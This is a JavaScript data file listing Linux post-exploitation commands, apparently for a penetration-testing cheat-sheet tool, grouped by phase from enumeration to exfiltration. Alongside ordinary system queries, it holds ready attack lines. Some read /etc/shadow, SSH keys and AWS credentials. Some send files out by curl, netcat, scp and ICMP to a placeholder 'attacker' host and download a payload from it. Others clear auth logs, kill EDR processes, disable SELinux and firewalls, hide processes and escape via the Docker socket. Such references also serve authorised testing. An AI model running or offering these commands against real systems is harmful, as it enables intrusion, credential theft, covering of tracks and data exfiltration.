export const linuxCommands = [
  // AWARENESS
  {
    id: "lin-aware-001",
    os: "linux",
    category: "awareness",
    subcategory: "bash",
    title: "System Information",
    description: "Display system information",
    command: "uname -a",
    example: "cat /etc/os-release",
    tools: [],
    tags: ["system", "kernel", "os"]
  },
  {
    id: "lin-aware-002",
    os: "linux",
    category: "awareness",
    subcategory: "bash",
    title: "Current User",
    description: "Show current user and groups",
    command: "id",
    example: "whoami && groups",
    tools: [],
    tags: ["user", "groups", "privileges"]
  },
  {
    id: "lin-aware-003",
    os: "linux",
    category: "awareness",
    subcategory: "bash",
    title: "Sudo Privileges",
    description: "Check sudo permissions",
    command: "sudo -l",
    example: null,
    tools: ["GTFOBins"],
    tags: ["sudo", "privileges", "root"]
  },
  {
    id: "lin-aware-004",
    os: "linux",
    category: "awareness",
    subcategory: "bash",
    title: "Hostname",
    description: "Display the hostname",
    command: "hostname",
    example: "cat /etc/hostname",
    tools: [],
    tags: ["hostname", "name"]
  },
  {
    id: "lin-aware-005",
    os: "linux",
    category: "awareness",
    subcategory: "bash",
    title: "Environment Variables",
    description: "List environment variables",
    command: "env",
    example: "printenv",
    tools: [],
    tags: ["environment", "variables", "env"]
  },

  // ENUMERATION
  {
    id: "lin-enum-001",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Running Processes",
    description: "List all running processes",
    command: "ps aux",
    example: "ps aux | grep root",
    tools: [],
    tags: ["processes", "running"]
  },
  {
    id: "lin-enum-002",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Detect EDR/AV",
    description: "Check for security products",
    command: "ps aux | grep -i 'falcon|crowdstrike|sentinel|defender|sophos'",
    example: null,
    tools: [],
    tags: ["edr", "av", "security"]
  },
  {
    id: "lin-enum-003",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "List Users",
    description: "Show all system users",
    command: "cat /etc/passwd",
    example: "cat /etc/passwd | grep -v nologin",
    tools: [],
    tags: ["users", "accounts"]
  },
  {
    id: "lin-enum-004",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "List Groups",
    description: "Show all system groups",
    command: "cat /etc/group",
    example: "getent group sudo",
    tools: [],
    tags: ["groups", "permissions"]
  },
  {
    id: "lin-enum-005",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Installed Packages",
    description: "List installed packages",
    command: "dpkg -l",
    example: "rpm -qa",
    tools: [],
    tags: ["packages", "software", "installed"]
  },

  // NETWORK
  {
    id: "lin-net-001",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Network Interfaces",
    description: "Display network configuration",
    command: "ip addr show",
    example: "ifconfig -a",
    tools: [],
    tags: ["network", "interfaces", "ip"]
  },
  {
    id: "lin-net-002",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Listening Ports",
    description: "Show listening network ports",
    command: "netstat -tulpn",
    example: "ss -tulpn",
    tools: [],
    tags: ["ports", "services", "network"]
  },
  {
    id: "lin-net-003",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Active Connections",
    description: "Display active network connections",
    command: "netstat -antp",
    example: "ss -tnp",
    tools: [],
    tags: ["connections", "established"]
  },
  {
    id: "lin-net-004",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "ARP Cache",
    description: "Display ARP table",
    command: "arp -a",
    example: "ip neigh",
    tools: [],
    tags: ["arp", "cache", "neighbors"]
  },
  {
    id: "lin-net-005",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Routing Table",
    description: "Display routing table",
    command: "ip route",
    example: "route -n",
    tools: [],
    tags: ["route", "routing", "gateway"]
  },

  // CREDENTIALS
  {
    id: "lin-cred-001",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Command History",
    description: "Read bash command history",
    command: "cat ~/.bash_history",
    example: 'find / -name ".*history" 2>/dev/null',
    tools: [],
    tags: ["history", "commands", "passwords"]
  },
  {
    id: "lin-cred-002",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "SSH Keys",
    description: "Find SSH private keys",
    command: "find / -name id_rsa 2>/dev/null",
    example: "cat ~/.ssh/id_rsa",
    tools: [],
    tags: ["ssh", "keys", "private"]
  },
  {
    id: "lin-cred-003",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Password Files",
    description: "Search for password in config files",
    command: 'grep -r "password" /etc/*.conf 2>/dev/null',
    example: 'find / -name "*.conf" 2>/dev/null | xargs grep -i password',
    tools: [],
    tags: ["passwords", "config", "files"]
  },
  {
    id: "lin-cred-004",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Shadow File",
    description: "Attempt to read shadow file",
    command: "cat /etc/shadow",
    example: null,
    tools: ["John", "Hashcat"],
    tags: ["shadow", "hashes", "passwords"]
  },
  {
    id: "lin-cred-005",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Database Credentials",
    description: "Find database config files",
    command: 'find / -name "*.php" 2>/dev/null | xargs grep -l "mysql\\|password" 2>/dev/null',
    example: "cat /var/www/html/wp-config.php",
    tools: [],
    tags: ["database", "mysql", "credentials"]
  },

  // PRIVILEGE ESCALATION
  {
    id: "lin-privesc-001",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "SUID Binaries",
    description: "Find SUID executables",
    command: "find / -perm -4000 2>/dev/null",
    example: "find / -perm -u=s -type f 2>/dev/null",
    tools: ["GTFOBins"],
    tags: ["suid", "permissions", "binaries"]
  },
  {
    id: "lin-privesc-002",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Capabilities",
    description: "List file capabilities",
    command: "getcap -r / 2>/dev/null",
    example: null,
    tools: [],
    tags: ["capabilities", "permissions"]
  },
  {
    id: "lin-privesc-003",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Writable /etc/passwd",
    description: "Check if /etc/passwd is writable",
    command: "ls -la /etc/passwd",
    example: null,
    tools: [],
    tags: ["passwd", "writable", "permissions"]
  },
  {
    id: "lin-privesc-004",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Cron Jobs",
    description: "List all cron jobs",
    command: "cat /etc/crontab",
    example: "ls -la /etc/cron.*",
    tools: [],
    tags: ["cron", "scheduled", "tasks"]
  },
  {
    id: "lin-privesc-005",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "World Writable Directories",
    description: "Find world-writable directories",
    command: "find / -type d -perm -002 2>/dev/null",
    example: null,
    tools: [],
    tags: ["writable", "directories", "permissions"]
  },
  {
    id: "lin-privesc-006",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Kernel Exploits",
    description: "Check kernel version for exploits",
    command: "uname -r",
    example: "cat /proc/version",
    tools: ["Linux-Exploit-Suggester"],
    tags: ["kernel", "exploits", "version"]
  },

  // PERSISTENCE
  {
    id: "lin-persist-001",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "User Crontab",
    description: "View user's cron jobs",
    command: "crontab -l",
    example: "cat /var/spool/cron/crontabs/*",
    tools: [],
    tags: ["cron", "persistence", "scheduled"]
  },
  {
    id: "lin-persist-002",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "Bashrc Injection",
    description: "Check bashrc files",
    command: "cat ~/.bashrc",
    example: "ls -la ~/.*rc",
    tools: [],
    tags: ["bashrc", "profile", "persistence"]
  },
  {
    id: "lin-persist-003",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "SSH Authorized Keys",
    description: "View authorized SSH keys",
    command: "cat ~/.ssh/authorized_keys",
    example: "ls -la /home/*/.ssh/authorized_keys",
    tools: [],
    tags: ["ssh", "keys", "persistence"]
  },
  {
    id: "lin-persist-004",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "Systemd Services",
    description: "List systemd services",
    command: "systemctl list-unit-files",
    example: "ls -la /etc/systemd/system/",
    tools: [],
    tags: ["systemd", "services", "persistence"]
  },
  {
    id: "lin-persist-005",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "Init Scripts",
    description: "Check init scripts",
    command: "ls -la /etc/init.d/",
    example: "cat /etc/rc.local",
    tools: [],
    tags: ["init", "startup", "scripts"]
  },

  // LATERAL MOVEMENT
  {
    id: "lin-lateral-001",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "Active Users",
    description: "Show logged in users",
    command: "w",
    example: "who -a",
    tools: [],
    tags: ["users", "logged in", "sessions"]
  },
  {
    id: "lin-lateral-002",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "Login History",
    description: "View login history",
    command: "last",
    example: "lastlog",
    tools: [],
    tags: ["history", "logins", "users"]
  },
  {
    id: "lin-lateral-003",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "Home Directories",
    description: "List user home directories",
    command: "ls -la /home/",
    example: null,
    tools: [],
    tags: ["home", "users", "directories"]
  },
  {
    id: "lin-lateral-004",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "SSH to Target",
    description: "SSH into another machine",
    command: "ssh user@target",
    example: "ssh -i ~/.ssh/id_rsa user@target",
    tools: [],
    tags: ["ssh", "remote", "connection"]
  },
  {
    id: "lin-lateral-005",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "NFS Shares",
    description: "List NFS exports",
    command: "showmount -e target",
    example: "cat /etc/exports",
    tools: [],
    tags: ["nfs", "shares", "mounts"]
  },

  // ============================================
  // DEFENSE EVASION
  // ============================================
  {
    id: "lin-defevade-001",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Disable SELinux",
    description: "Temporarily disable SELinux",
    command: "setenforce 0",
    example: "getenforce",
    tools: [],
    tags: ["selinux", "bypass", "security"]
  },
  {
    id: "lin-defevade-002",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Disable AppArmor",
    description: "Stop AppArmor service",
    command: "systemctl stop apparmor",
    example: "aa-status",
    tools: [],
    tags: ["apparmor", "bypass", "security"]
  },
  {
    id: "lin-defevade-003",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Clear Logs",
    description: "Wipe system logs",
    command: "truncate -s 0 /var/log/auth.log",
    example: "echo '' > /var/log/wtmp && echo '' > /var/log/btmp",
    tools: [],
    tags: ["logs", "cleanup", "antiforensics"]
  },
  {
    id: "lin-defevade-004",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Disable History Logging",
    description: "Prevent bash history from being saved",
    command: "unset HISTFILE",
    example: "export HISTSIZE=0",
    tools: [],
    tags: ["history", "evasion", "bash"]
  },
  {
    id: "lin-defevade-005",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Hide Process",
    description: "Hide process from ps output",
    command: "exec -a \"[kworker/0:0]\" ./malware",
    example: null,
    tools: [],
    tags: ["process", "hiding", "evasion"]
  },
  {
    id: "lin-defevade-006",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Timestomp Files",
    description: "Modify file timestamps",
    command: "touch -r /etc/passwd malware.sh",
    example: "touch -d \"2020-01-01 12:00:00\" file.txt",
    tools: [],
    tags: ["timestamp", "antiforensics", "touch"]
  },
  {
    id: "lin-defevade-007",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Disable UFW Firewall",
    description: "Turn off Ubuntu firewall",
    command: "ufw disable",
    example: "ufw status",
    tools: [],
    tags: ["firewall", "ufw", "bypass"]
  },
  {
    id: "lin-defevade-008",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Kill AV Processes",
    description: "Terminate security processes",
    command: "pkill -9 -f 'falcon|crowdstrike|sentinel'",
    example: null,
    tools: [],
    tags: ["av", "edr", "kill"]
  },
  {
    id: "lin-defevade-009",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Rootkit Check Evasion",
    description: "Hide from basic rootkit scanners",
    command: "alias ls='ls --hide=malware'",
    example: null,
    tools: [],
    tags: ["rootkit", "hiding", "alias"]
  },
  {
    id: "lin-defevade-010",
    os: "linux",
    category: "defevade",
    subcategory: "bash",
    title: "Clear Specific History",
    description: "Remove specific commands from history",
    command: "history -d $(history | grep 'password' | awk '{print $1}')",
    example: "history -c",
    tools: [],
    tags: ["history", "cleanup", "selective"]
  },

  // ============================================
  // DATA EXFILTRATION
  // ============================================
  {
    id: "lin-exfil-001",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "HTTP File Upload",
    description: "Upload file via curl",
    command: "curl -X POST -F 'file=@/etc/passwd' http://attacker/upload",
    example: "curl -T file.txt http://attacker/upload",
    tools: [],
    tags: ["upload", "curl", "http"]
  },
  {
    id: "lin-exfil-002",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "Base64 Exfiltration",
    description: "Encode and exfil via DNS/HTTP",
    command: "cat /etc/shadow | base64 | curl -d @- http://attacker",
    example: "base64 -w0 sensitive.txt",
    tools: [],
    tags: ["base64", "exfil", "encoding"]
  },
  {
    id: "lin-exfil-003",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "Netcat File Transfer",
    description: "Send file via netcat",
    command: "cat file.txt | nc attacker 4444",
    example: "nc -lvp 4444 > received.txt",
    tools: ["netcat"],
    tags: ["netcat", "transfer", "tcp"]
  },
  {
    id: "lin-exfil-004",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "SCP File Copy",
    description: "Copy file via SCP",
    command: "scp /etc/passwd user@attacker:/tmp/",
    example: null,
    tools: [],
    tags: ["scp", "ssh", "transfer"]
  },
  {
    id: "lin-exfil-005",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "Archive and Compress",
    description: "Create tarball for exfil",
    command: "tar -czf /tmp/data.tar.gz /home/user/sensitive/",
    example: "zip -r data.zip /var/www/",
    tools: [],
    tags: ["archive", "compression", "tar"]
  },
  {
    id: "lin-exfil-006",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "ICMP Exfiltration",
    description: "Exfiltrate data via ICMP packets",
    command: "ping -c 1 -p $(xxd -p -c 32 file.txt | head -1) attacker",
    example: null,
    tools: [],
    tags: ["icmp", "ping", "covert"]
  },
  {
    id: "lin-exfil-007",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "Download File",
    description: "Download file from remote server",
    command: "wget http://attacker/payload -O /tmp/payload",
    example: "curl -o /tmp/tool http://attacker/tool",
    tools: [],
    tags: ["download", "wget", "curl"]
  },
  {
    id: "lin-exfil-008",
    os: "linux",
    category: "exfiltration",
    subcategory: "bash",
    title: "Memory Dump",
    description: "Dump process memory",
    command: "gcore -o /tmp/dump $(pidof process)",
    example: "cat /proc/$(pidof process)/maps",
    tools: [],
    tags: ["memory", "dump", "process"]
  },

  // ============================================
  // EXPANDED ENUMERATION
  // ============================================
  {
    id: "lin-enum-016",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Kernel Modules",
    description: "List loaded kernel modules",
    command: "lsmod",
    example: "modinfo module_name",
    tools: [],
    tags: ["kernel", "modules", "drivers"]
  },
  {
    id: "lin-enum-017",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Disk Usage",
    description: "Show disk space usage",
    command: "df -h",
    example: "du -sh /var/*",
    tools: [],
    tags: ["disk", "storage", "filesystem"]
  },
  {
    id: "lin-enum-018",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Open Files",
    description: "List open files by process",
    command: "lsof -p $(pgrep process_name)",
    example: "lsof -i :80",
    tools: [],
    tags: ["files", "open", "lsof"]
  },
  {
    id: "lin-enum-019",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "System Timers",
    description: "List systemd timers",
    command: "systemctl list-timers --all",
    example: null,
    tools: [],
    tags: ["timers", "systemd", "scheduled"]
  },
  {
    id: "lin-enum-020",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Mounted Filesystems",
    description: "Show all mounted filesystems",
    command: "mount | column -t",
    example: "cat /proc/mounts",
    tools: [],
    tags: ["mount", "filesystem", "drives"]
  },
  {
    id: "lin-enum-021",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "All Environment Variables",
    description: "Display all environment variables",
    command: "printenv",
    example: "env",
    tools: [],
    tags: ["environment", "variables", "config"]
  },
  {
    id: "lin-enum-022",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Running Containers",
    description: "List Docker containers",
    command: "docker ps -a",
    example: "docker images",
    tools: [],
    tags: ["docker", "containers", "virtualization"]
  },
  {
    id: "lin-enum-023",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Detailed Kernel Version",
    description: "Display detailed kernel info",
    command: "uname -r",
    example: "cat /proc/version",
    tools: [],
    tags: ["kernel", "version", "os"]
  },
  {
    id: "lin-enum-024",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Debian Packages",
    description: "List installed packages (Debian)",
    command: "dpkg -l",
    example: "apt list --installed",
    tools: [],
    tags: ["packages", "software", "installed"]
  },
  {
    id: "lin-enum-025",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "RPM Packages",
    description: "List installed packages (RedHat)",
    command: "rpm -qa",
    example: "yum list installed",
    tools: [],
    tags: ["rpm", "packages", "redhat"]
  },
  {
    id: "lin-enum-026",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "Login Sessions",
    description: "Show current login sessions",
    command: "who -a",
    example: "w",
    tools: [],
    tags: ["sessions", "users", "logins"]
  },
  {
    id: "lin-enum-027",
    os: "linux",
    category: "enumeration",
    subcategory: "bash",
    title: "System Uptime",
    description: "Show system uptime and load",
    command: "uptime",
    example: "cat /proc/uptime",
    tools: [],
    tags: ["uptime", "load", "system"]
  },

  // ============================================
  // EXPANDED PRIVILEGE ESCALATION
  // ============================================
  {
    id: "lin-privesc-012",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "SGID Binaries",
    description: "Find SGID executables",
    command: "find / -perm -2000 2>/dev/null",
    example: null,
    tools: [],
    tags: ["sgid", "permissions", "binaries"]
  },
  {
    id: "lin-privesc-013",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "World Writable Directories",
    description: "Find world-writable directories",
    command: "find / -type d -perm -222 2>/dev/null",
    example: "find / -type d \\( -perm -g+w -or -perm -o+w \\) -exec ls -ld {} \\; 2>/dev/null",
    tools: [],
    tags: ["writable", "directories", "permissions"]
  },
  {
    id: "lin-privesc-014",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Kernel Exploit Check",
    description: "Check kernel version for known exploits",
    command: "uname -a && cat /etc/issue",
    example: "searchsploit kernel $(uname -r)",
    tools: ["Linux Exploit Suggester"],
    tags: ["kernel", "exploits", "version"]
  },
  {
    id: "lin-privesc-015",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "NFS no_root_squash",
    description: "Check for NFS no_root_squash",
    command: "cat /etc/exports",
    example: "showmount -e localhost",
    tools: [],
    tags: ["nfs", "shares", "nosquash"]
  },
  {
    id: "lin-privesc-016",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Docker Socket Access",
    description: "Check for accessible Docker socket",
    command: "ls -la /var/run/docker.sock",
    example: "docker run -v /:/host -it ubuntu chroot /host bash",
    tools: [],
    tags: ["docker", "socket", "escape"]
  },
  {
    id: "lin-privesc-017",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "Password Policy",
    description: "Check password policy settings",
    command: "cat /etc/login.defs",
    example: "cat /etc/pam.d/common-password",
    tools: [],
    tags: ["password", "policy", "pam"]
  },
  {
    id: "lin-privesc-018",
    os: "linux",
    category: "privesc",
    subcategory: "bash",
    title: "LD_PRELOAD Exploit",
    description: "Check if LD_PRELOAD is preserved in sudo",
    command: "sudo -l | grep LD_PRELOAD",
    example: null,
    tools: [],
    tags: ["ld_preload", "sudo", "exploit"]
  },

  // ============================================
  // EXPANDED NETWORK
  // ============================================
  {
    id: "lin-net-011",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "DNS Configuration",
    description: "Check DNS resolver settings",
    command: "cat /etc/resolv.conf",
    example: "systemd-resolve --status",
    tools: [],
    tags: ["dns", "resolver", "config"]
  },
  {
    id: "lin-net-012",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Routing Table Details",
    description: "Display routing table",
    command: "ip route show",
    example: "route -n",
    tools: [],
    tags: ["routing", "network", "gateway"]
  },
  {
    id: "lin-net-013",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "ARP Table",
    description: "Display ARP table",
    command: "ip neigh show",
    example: "arp -a",
    tools: [],
    tags: ["arp", "cache", "neighbors"]
  },
  {
    id: "lin-net-014",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Firewall Rules",
    description: "List iptables rules",
    command: "iptables -L -n -v",
    example: "iptables-save",
    tools: [],
    tags: ["iptables", "firewall", "rules"]
  },
  {
    id: "lin-net-015",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Network Statistics",
    description: "Show network interface statistics",
    command: "netstat -i",
    example: "ip -s link",
    tools: [],
    tags: ["statistics", "network", "interfaces"]
  },
  {
    id: "lin-net-016",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Hosts File",
    description: "View hosts file entries",
    command: "cat /etc/hosts",
    example: null,
    tools: [],
    tags: ["hosts", "dns", "config"]
  },
  {
    id: "lin-net-017",
    os: "linux",
    category: "network",
    subcategory: "bash",
    title: "Port Scan",
    description: "Simple port scan without nmap",
    command: "for p in {1..1024}; do timeout 1 bash -c \"</dev/tcp/target/$p\" && echo \"$p open\"; done 2>/dev/null",
    example: null,
    tools: [],
    tags: ["portscan", "network", "tcp"]
  },

  // ============================================
  // EXPANDED CREDENTIALS
  // ============================================
  {
    id: "lin-cred-011",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "MySQL History",
    description: "Read MySQL command history",
    command: "cat ~/.mysql_history",
    example: null,
    tools: [],
    tags: ["mysql", "history", "database"]
  },
  {
    id: "lin-cred-012",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Git Credentials",
    description: "Search for git credentials",
    command: "find / -name .git-credentials 2>/dev/null",
    example: "cat ~/.git-credentials",
    tools: [],
    tags: ["git", "credentials", "passwords"]
  },
  {
    id: "lin-cred-013",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Environment Passwords",
    description: "Search env vars for passwords",
    command: "env | grep -i pass",
    example: "cat /proc/*/environ | tr '\\0' '\\n' | grep -i password 2>/dev/null",
    tools: [],
    tags: ["environment", "passwords", "variables"]
  },
  {
    id: "lin-cred-014",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Backup Files",
    description: "Find backup files with credentials",
    command: "find / -name '*.bak' -o -name '*.backup' -o -name '*~' 2>/dev/null",
    example: null,
    tools: [],
    tags: ["backup", "files", "credentials"]
  },
  {
    id: "lin-cred-015",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "Database Config Files",
    description: "Search for database configuration",
    command: "find / -name 'database.yml' -o -name 'db.conf' -o -name 'my.cnf' 2>/dev/null",
    example: "grep -r \"password\" /var/www/ 2>/dev/null",
    tools: [],
    tags: ["database", "config", "passwords"]
  },
  {
    id: "lin-cred-016",
    os: "linux",
    category: "credentials",
    subcategory: "bash",
    title: "AWS Credentials",
    description: "Find AWS credential files",
    command: "find / -name credentials -path '*/.aws/*' 2>/dev/null",
    example: "cat ~/.aws/credentials",
    tools: [],
    tags: ["aws", "cloud", "credentials"]
  },

  // ============================================
  // EXPANDED PERSISTENCE
  // ============================================
  {
    id: "lin-persist-009",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "Profile Scripts",
    description: "Check profile startup scripts",
    command: "cat /etc/profile",
    example: "ls -la /etc/profile.d/",
    tools: [],
    tags: ["profile", "startup", "persistence"]
  },
  {
    id: "lin-persist-010",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "SysV Init Scripts",
    description: "List SysV init scripts",
    command: "ls -la /etc/init.d/",
    example: "chkconfig --list",
    tools: [],
    tags: ["init", "sysv", "persistence"]
  },
  {
    id: "lin-persist-011",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "At Jobs",
    description: "List scheduled at jobs",
    command: "atq",
    example: "at -c job_number",
    tools: [],
    tags: ["at", "scheduled", "persistence"]
  },
  {
    id: "lin-persist-012",
    os: "linux",
    category: "persistence",
    subcategory: "bash",
    title: "Message of the Day",
    description: "Check MOTD scripts for persistence",
    command: "ls -la /etc/update-motd.d/",
    example: "cat /etc/motd",
    tools: [],
    tags: ["motd", "persistence", "startup"]
  },

  // ============================================
  // EXPANDED LATERAL MOVEMENT
  // ============================================
  {
    id: "lin-lateral-009",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "SSH Config",
    description: "Read SSH configuration",
    command: "cat ~/.ssh/config",
    example: "cat /etc/ssh/ssh_config",
    tools: [],
    tags: ["ssh", "config", "hosts"]
  },
  {
    id: "lin-lateral-010",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "Known Hosts",
    description: "View SSH known hosts",
    command: "cat ~/.ssh/known_hosts",
    example: null,
    tools: [],
    tags: ["ssh", "known_hosts", "targets"]
  },
  {
    id: "lin-lateral-011",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "Kerberos Tickets",
    description: "List Kerberos tickets",
    command: "klist",
    example: "cat /tmp/krb5cc_*",
    tools: [],
    tags: ["kerberos", "tickets", "authentication"]
  },
  {
    id: "lin-lateral-012",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "NFS Mounts",
    description: "Show NFS mounted shares",
    command: "showmount -e",
    example: "mount | grep nfs",
    tools: [],
    tags: ["nfs", "shares", "mounts"]
  },
  {
    id: "lin-lateral-013",
    os: "linux",
    category: "lateral",
    subcategory: "bash",
    title: "SSH Agent Forwarding",
    description: "Check SSH agent sockets",
    command: "find /tmp -name 'agent.*' 2>/dev/null",
    example: "echo $SSH_AUTH_SOCK",
    tools: [],
    tags: ["ssh", "agent", "forwarding"]
  }
];
